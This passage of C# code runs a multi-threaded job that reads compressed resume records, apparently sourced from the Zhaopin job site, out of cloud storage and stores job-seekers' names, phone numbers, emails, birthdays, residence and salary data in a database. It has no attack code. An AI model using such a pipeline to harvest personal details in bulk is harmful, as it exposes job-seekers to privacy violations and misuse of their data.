            Task.Run(() => ListObject(mangningOssClient, mangningBucketName));

            for (var i = 0; i < 16; i++)
            {
                Task.Run(() => ExportOssResume());
            }
        }

        /// <summary>
        /// 获取Oss简历列表
        /// </summary>
        /// <param name="client"></param>
        /// <param name="bucketName"></param>
        private static void ListObject(IOss client, string bucketName)
        {
            InitDataByXML();

            while (true)
            {
                try
                {
                    ObjectListing result;

                    var nextMarker = File.ReadAllText("NextMarker.txt");

                    do
                    {
                        var listObjectsRequest = new ListObjectsRequest(bucketName)
                        {
                            Prefix = "Zhaopin/Resume/",
                            Marker = nextMarker,
                            MaxKeys = 100
                        };

                        result = client.ListObjects(listObjectsRequest);

                        foreach (var summary in result.ObjectSummaries)
                        {
                            fileQueue.Enqueue(summary.Key);
                        }

                        while (true)
                        {
                            if (fileQueue.Count != 0)
                            {
                                Thread.Sleep(100);

                                continue;
                            }

                            break;
                        }

                        nextMarker = result.NextMarker;

                        File.WriteAllText("NextMarker.txt", nextMarker);

                    } while (result.IsTruncated);
                }
                catch (Exception ex)
                {
                    Trace.TraceError("List object failed. {0}", ex.Message);
                }

                Thread.Sleep(5000);
            }
        }

        /// <summary>
        /// 初始化XML映射文档
        /// </summary>
        public static void InitDataByXML()
        {
            maritalStatusDoc.Load(@"Data\MaritalStatus.xml");

            degreeDoc.Load(@"Data\Degree.xml");

            industryDoc.Load(@"Data\Industry.xml");

            positionDoc.Load(@"Data\Position.xml");

            districtDoc.Load(@"Data\District.xml");

            careerStatusDoc.Load(@"Data\DutyTime.xml");
        }

        /// <summary>
        /// 导出Oss简历
        /// </summary>
        private static void ExportOssResume()
        {
            var stopwatch = new Stopwatch();

            while (true)
            {
                string path;

                if (!fileQueue.TryDequeue(out path))
                {
                    Thread.Sleep(100);

                    continue;
                }

                var resumeId = 0;

                try
                {
                    stopwatch.Restart();

                    using (var stream = new MemoryStream())
                    {
                        var bytes = new byte[1024];

                        int len;

                        var streamContent = mangningOssClient.GetObject(mangningBucketName, path).Content;

                        while ((len = streamContent.Read(bytes, 0, bytes.Length)) > 0)
                        {
                            stream.Write(bytes, 0, len);
                        }

                        int.TryParse(Path.GetFileNameWithoutExtension(path), out resumeId);

                        HandleResume(Encoding.UTF8.GetString(GZip.Decompress(stream.ToArray())), resumeId);
                    }

                    stopwatch.Stop();

                    var elapsed = stopwatch.ElapsedMilliseconds;

                    Interlocked.Increment(ref total);

                    Console.WriteLine($"{DateTime.Now} > ResumeID = {resumeId}, Elapsed = {elapsed} ms, Total = {total}.");
                }
                catch (InvalidDataException ex)
                {
                    Trace.TraceError($"流异常 ResumeId = {resumeId}, 异常 = {ex.Message}.");
                }
                catch (Exception ex)
                {
                    Trace.TraceError($"异常 ResumeId = {resumeId}, 异常 = {ex}.");
                }
            }
        }

        /// <summary>
        /// 处理简历
        /// </summary>
        /// <param name="jsonContent"></param>
        /// <param name="resumeId"></param>
        public static void HandleResume(string jsonContent, int resumeId)
        {
            try
            {
                using (var db = new BadoucaiDataDBEntities())
                {
                    var resume = db.Resume.FirstOrDefault(f => f.Id == resumeId);

                    var resumeObj = JsonConvert.DeserializeObject<dynamic>(jsonContent);

                    var detialJSonStr = JsonConvert.DeserializeObject<dynamic>(resumeObj.detialJSonStr.ToString());

                    var refreshDate = BaseFanctory.GetTime((string)detialJSonStr.DateLastReleased).ToUniversalTime();

                    if (resume != null && resume.RefreshDate.Date >= refreshDate.Date) return;

                    var userDetials = resumeObj.userDetials;

                    var cellphone = (string)userDetials.mobilePhone;

                    if (string.IsNullOrEmpty(cellphone)) throw new Exception("Cellphone is empty");

                    if (resume == null)
                    {
                        resume = new EntityFramework.MySql.Resume { Id = resumeId };

                        db.Resume.Add(resume);
                    }

                    resume.Name = (string)userDetials.userName;

                    int gender;

                    if (int.TryParse((string)userDetials.gender, out gender))
                    {
                        #region v1 版本

                        resume.Gender = (int)userDetials.gender == 1 ? "男" : "女";

                        resume.Birthday = Convert.ToDateTime((string)userDetials.birthStr);

                        resume.MaritalStatus = maritalStatusDoc.SelectSingleNode($"//*[@source-key='{(string)userDetials.maritalStatus}']")?.Attributes?["source-value"].Value ?? "";

                        var workYear = Regex.Match((string)userDetials.workYearsRangeId, "^[0-9]*").Value;

                        if (!string.IsNullOrEmpty(workYear)) resume.WorkStarts = Convert.ToDateTime(DateTime.Now.Year - Convert.ToInt32(workYear) + "-01-01");

                        resume.DegreeText = degreeDoc.SelectSingleNode($"//*[@source-key='{(string)detialJSonStr.CurrentEducationLevel}']")?.Attributes?["source-value"].Value ?? "";

                        resume.DegreeValue = detialJSonStr.CurrentEducationLevel == null ? (short)0 : (short)detialJSonStr.CurrentEducationLevel;

                        var city = districtDoc.SelectSingleNode($"//*[@source-key='{(string)userDetials.cityId}']")?.Attributes?["source-value"].Value ?? ""; 

                        var district = districtDoc.SelectSingleNode($"//*[@source-key='{(string)userDetials.cityDistrictId}']")?.Attributes?["source-value"].Value ?? ""; 

                        resume.CurrentResidenceText = city == district ? city : city + district;

                        if (!string.IsNullOrEmpty((string)userDetials.cityId) && !string.IsNullOrEmpty((string)userDetials.cityDistrictId))
                        {
                            resume.CurrentResidenceValue = userDetials.cityDistrictId == null ? (int)userDetials.cityId : (int)userDetials.cityDistrictId;
                        }

                        var hkProvince = districtDoc.SelectSingleNode($"//*[@source-key='{(string)userDetials.hOUKOUProvinceId}']")?.Attributes?["source-value"].Value ?? ""; 

                        var hkCity = districtDoc.SelectSingleNode($"//*[@source-key='{(string)userDetials.hUKOUCityId}']")?.Attributes?["source-value"].Value ?? "";

                        resume.RegisteredResidencText = hkProvince == hkCity ? hkProvince : hkProvince + hkCity;

                        if (!string.IsNullOrEmpty((string)userDetials.hOUKOUProvinceId) && !string.IsNullOrEmpty((string)userDetials.hUKOUCityId))
                        {
                            resume.RegisteredResidencValue = (int)userDetials.hUKOUCityId == 0 ? (int)userDetials.hOUKOUProvinceId : (int)userDetials.hUKOUCityId;
                        }

                        resume.Cellphone = cellphone;

                        resume.Email = (string)userDetials.email;

                        var desiredCityIdArray = detialJSonStr.DesiredCity == null ? "".Split(",") : ((string)detialJSonStr.DesiredCity).Split(",");

                        var desiredCityList = desiredCityIdArray.TakeWhile((t, i) => i < 3).Select(t => districtDoc.SelectSingleNode($"//*[@source-key='{t}']")?.Attributes?["source-value"].Value ?? "").ToList();

                        resume.DesiredCityText = string.Join(",", desiredCityList);

                        resume.DesiredCityValue = string.Join(",", desiredCityIdArray.Take(3));

                        resume.DesiredSalaryScopeMin = detialJSonStr.DesiredSalaryScope == null || (long)detialJSonStr.DesiredSalaryScope == 0 ? 0 : Convert.ToInt32(((string)detialJSonStr.DesiredSalaryScope).PadLeft(10, '0').Substring(0, 5));

                        resume.DesiredSalaryScopeMax = detialJSonStr.DesiredSalaryScope == null || (long)detialJSonStr.DesiredSalaryScope == 0 ? 0 : Convert.ToInt32(((string)detialJSonStr.DesiredSalaryScope).PadLeft(10, '0').Remove(0, 5));

                        resume.CurrentCareerStatusText = careerStatusDoc.SelectSingleNode($"//*[@source-key='{(string)detialJSonStr.CurrentCareerStatus}']")?.Attributes?["source-value"].Value ?? "";

                        resume.CurrentCareerStatusValue = detialJSonStr.CurrentCareerStatus == null ? 0 : (int)detialJSonStr.CurrentCareerStatus;

                        var desiredPositionIdArray = detialJSonStr.DesiredPosition.Count == 0 || detialJSonStr.DesiredPosition[0].DesiredJobType == null ? "".Split(",") : ((string)detialJSonStr.DesiredPosition[0].DesiredJobType).Split(",");

                        var desiredPositionList = desiredPositionIdArray.TakeWhile((t, i) => i < 3).Select(t => positionDoc.SelectSingleNode($"//*[@source-key='{t}']")?.Attributes?["source-value"].Value ?? "").ToList();

                        resume.DesiredPositionText = string.Join(",", desiredPositionList);

                        resume.DesiredPositionValue = string.Join(",", desiredPositionIdArray.Take(3));

                        var desiredIndustryIdArray = detialJSonStr.DesiredPosition.Count == 0 || detialJSonStr.DesiredPosition[0].DesiredIndustry == null ? "".Split(",") : ((string)detialJSonStr.DesiredPosition[0].DesiredIndustry).Split(",");

                        var desiredIndustryList = desiredIndustryIdArray.TakeWhile((t, i) => i < 3).Select(t => industryDoc.SelectSingleNode($"//*[@source-key='{t}']")?.Attributes?["source-value"].Value ?? "").ToList();

                        resume.DesiredIndustryText = string.Join(",", desiredIndustryList);

                        resume.DesiredIndustryValue = string.Join(",", desiredIndustryIdArray.Take(3));

                        resume.HistoryJobTitle = ((JArray)detialJSonStr.WorkExperience).Take(3).Aggregate("", (current, t) => $"{current},{((string)t["JobTitle"]).Replace(",", "，")}");

                        if (!string.IsNullOrEmpty(resume.HistoryJobTitle)) resume.HistoryJobTitle = resume.HistoryJobTitle.Substring(1);

                        resume.LastJobSalaryScopeMin = detialJSonStr.WorkExperience.Count != 0 ? (detialJSonStr.WorkExperience[0].Salary == null || (string)detialJSonStr.WorkExperience[0].Salary == "" ? 0 : ((long)detialJSonStr.WorkExperience[0].Salary == 0 ? 0 : Convert.ToInt32(((string)detialJSonStr.WorkExperience[0].Salary).PadLeft(10, '0').Substring(0, 5)))) : 0;

                        resume.LastJobSalaryScopeMax = detialJSonStr.WorkExperience.Count != 0 ? (detialJSonStr.WorkExperience[0].Salary == null || (string)detialJSonStr.WorkExperience[0].Salary == "" ? 0 : ((long)detialJSonStr.WorkExperience[0].Salary == 0 ? 0 : Convert.ToInt32(((string)detialJSonStr.WorkExperience[0].Salary).PadLeft(10, '0').Remove(0, 5)))) : 0;

                        resume.RefreshDate = refreshDate;

                        #endregion
                    }
                    else
                    {
                        #region v2 版本

                        resume.Gender = (string)userDetials.gender;

                        resume.Birthday = Convert.ToDateTime((string)userDetials.birthStr);

                        resume.MaritalStatus = (string)userDetials.maritalStatus;

                        var workYear = (string)detialJSonStr.WorkYearsRangeId;

                        if (!string.IsNullOrEmpty(workYear)) resume.WorkStarts = Convert.ToDateTime(DateTime.Now.Year - Convert.ToInt32(workYear) + "-01-01");

                        resume.DegreeText = (string)detialJSonStr.CurrentEducationLevel;

                        resume.DegreeValue = Convert.ToInt16(degreeDoc.SelectSingleNode($"//*[@source-value='{(string)detialJSonStr.CurrentEducationLevel}']")?.Attributes?["source-key"].Value ?? "0");

                        resume.CurrentResidenceText = (string)userDetials.cityId;

                        resume.CurrentResidenceValue = Convert.ToInt32(districtDoc.SelectSingleNode($"//*[@source-value='{(string)userDetials.cityId}']")?.Attributes?["source-key"].Value ?? "0");

                        resume.RegisteredResidencText = (string)userDetials.hUKOUCityId;

                        resume.RegisteredResidencValue = Convert.ToInt32(districtDoc.SelectSingleNode($"//*[@source-value='{(string)userDetials.hUKOUCityId}']")?.Attributes?["source-key"].Value ?? "0");

                        resume.Cellphone = cellphone;

                        resume.Email = (string)userDetials.email;

                        var desiredCityIdArray = detialJSonStr.DesiredPosition.Count == 0 || detialJSonStr.DesiredPosition[0].DesiredCity == null ? "".Split("、") : ((string)detialJSonStr.DesiredPosition[0].DesiredCity).Split("、");

                        var desiredCityList = desiredCityIdArray.TakeWhile((t, i) => i < 3).Select(t => districtDoc.SelectSingleNode($"//*[@source-value='{t}']")?.Attributes?["source-key"].Value ?? "").ToList();

                        resume.DesiredCityText = string.Join(",", desiredCityIdArray.Take(3));

                        resume.DesiredCityValue = string.Join(",", desiredCityList);

                        resume.DesiredSalaryScopeMin = (long)detialJSonStr.DesiredSalaryScope == 0 ? 0 : Convert.ToInt32(((string)detialJSonStr.DesiredSalaryScope).PadLeft(10, '0').Substring(0, 5));

                        resume.DesiredSalaryScopeMax = (long)detialJSonStr.DesiredSalaryScope == 0 ? 0 : Convert.ToInt32(((string)detialJSonStr.DesiredSalaryScope).PadLeft(10, '0').Remove(0, 5));

                        //resume.CurrentCareerStatusText = careerStatusDoc.SelectSingleNode($"//*[@source-key='{(string)detialJSonStr.CurrentCareerStatus}']")?.Attributes?["source-value"].Value;

                        //resume.CurrentCareerStatusValue = (int)detialJSonStr.CurrentCareerStatus;

                        var desiredPositionIdArray = detialJSonStr.DesiredPosition.Count == 0 || detialJSonStr.DesiredPosition[0].DesiredJobType == null ? "".Split("、") : ((string)detialJSonStr.DesiredPosition[0].DesiredJobType).Split("、");

                        var desiredPositionList = desiredPositionIdArray.TakeWhile((t, i) => i < 3).Select(t => positionDoc.SelectSingleNode($"//*[@source-value='{t}']")?.Attributes?["source-key"].Value ?? "").ToList();

                        resume.DesiredPositionText = string.Join(",", desiredPositionIdArray.Take(3));

                        resume.DesiredPositionValue = string.Join(",", desiredPositionList);

                        var desiredIndustryIdArray = detialJSonStr.DesiredPosition.Count == 0 || detialJSonStr.DesiredPosition[0].DesiredIndustry == null ? "".Split("、") : ((string)detialJSonStr.DesiredPosition[0].DesiredIndustry).Split("、");

                        var desiredIndustryList = desiredIndustryIdArray.TakeWhile((t, i) => i < 3).Select(t => industryDoc.SelectSingleNode($"//*[@source-value='{t}']")?.Attributes?["source-key"].Value ?? "").ToList();

                        resume.DesiredIndustryText = string.Join(",", desiredIndustryIdArray.Take(3));

                        resume.DesiredIndustryValue = string.Join(",", desiredIndustryList);

                        resume.HistoryJobTitle = ((JArray)detialJSonStr.WorkExperience).Take(3).Aggregate("", (current, t) => $"{current},{((string)t["JobTitle"]).Replace(",", "，")}");

                        if (!string.IsNullOrEmpty(resume.HistoryJobTitle)) resume.HistoryJobTitle = resume.HistoryJobTitle.Substring(1);

                        resume.LastJobSalaryScopeMin = detialJSonStr.WorkExperience.Count != 0 ? (detialJSonStr.WorkExperience[0].Salary == null || (string)detialJSonStr.WorkExperience[0].Salary == "" ? 0 : ((long)detialJSonStr.WorkExperience[0].Salary == 0 ? 0 : Convert.ToInt32(((string)detialJSonStr.WorkExperience[0].Salary).PadLeft(10, '0').Substring(0, 5)))) : 0;

                        resume.LastJobSalaryScopeMax = detialJSonStr.WorkExperience.Count != 0 ? (detialJSonStr.WorkExperience[0].Salary == null || (string)detialJSonStr.WorkExperience[0].Salary == "" ? 0 : ((long)detialJSonStr.WorkExperience[0].Salary == 0 ? 0 : Convert.ToInt32(((string)detialJSonStr.WorkExperience[0].Salary).PadLeft(10, '0').Remove(0, 5)))) : 0;

                        resume.RefreshDate = refreshDate;

                        #endregion
                    }

                    db.SaveChanges();
                }
            }
            catch (Exception ex)
            {
                Trace.TraceError(ex.ToString());
            }
        }

        /// <summary>
        /// Watch 智联简历
        /// </summary>
        public static void WatchResume()
        {
            var business = new WatchOldResumeBusiness();

            business.Watch();
        }

        /// <summary>
        /// 匹配旧库简历
        /// </summary>
        public static void MatchResume()
        {
            var business = new MatchResumeLocationBusiness();

            business.Match();
        }

        /// <summary>
        /// 导出oss源文件
        /// </summary>
        /// <param name="resumeId"></param>
        public static void ExportOssResume(int resumeId)
        {
            var stream = new MemoryStream();

            var bytes = new byte[1024];

            int len;

            var streamContent = mangningOssClient.GetObject(mangningBucketName, $"Zhaopin/Resume/{resumeId}").Content;

            while ((len = streamContent.Read(bytes, 0, bytes.Length)) > 0)
            {
                stream.Write(bytes, 0, len);
            }

            File.WriteAllBytes($@"D:\{resumeId}.txt", GZip.Decompress(stream.ToArray()));
        }
    }
}
